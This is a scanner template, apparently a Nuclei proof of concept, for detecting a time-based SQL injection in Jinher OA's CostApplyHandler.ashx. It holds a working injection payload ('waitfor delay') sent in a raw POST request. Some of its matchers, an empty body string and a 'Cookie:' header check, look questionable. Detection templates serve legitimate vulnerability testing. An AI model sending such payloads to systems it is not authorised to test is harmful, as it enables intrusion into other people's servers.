id: poc-yaml-jinher-jhsoft-costapplyhandler-ashx-sqli
info:
  name: Jinher OA CostApplyHandler.ashx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Jinher OA CostApplyHandler.ashx is vulnerable to SQL injection, allowing an attacker to execute arbitrary SQL commands.

variables:
  t1: '{{rand_int(5, 10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=YeahChange&yeah=1'waitfor+delay%270:0:{{t1}}%27--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: header
        words:
          - "Cookie:"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
